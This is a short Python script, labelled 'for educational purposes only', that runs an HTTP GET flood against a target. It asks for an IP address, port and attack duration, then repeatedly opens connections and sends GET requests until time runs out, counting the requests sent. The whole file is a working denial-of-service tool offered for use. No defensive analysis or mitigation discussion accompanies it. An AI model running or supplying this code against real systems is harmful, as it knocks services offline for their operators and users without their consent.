# HTTP GET Flood Script (For Educational Purposes Only)
import socket
import time

target_ip = input("Enter the target IP address: ")  # Replace with the IP address of your target
target_port = int(input("Enter the target port: "))  # Replace with the port of your target service
duration = int(input("Enter the duration of the attack in seconds: "))  # Duration of the attack in seconds

timeout = time.time() + duration
sent_get_requests = 0

print(
    f"Starting HTTP GET flood attack on {target_ip}:{target_port} for {duration} seconds..."
)

while True:
    if time.time() > timeout:
        break
    try:
        sock = socket.create_connection((target_ip, target_port))
        sock.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
        sock.close()
        sent_get_requests += 1
    except Exception as e:
        print(f"Error: {e}")

print(f"Attack finished. Sent {sent_get_requests} HTTP GET requests.")
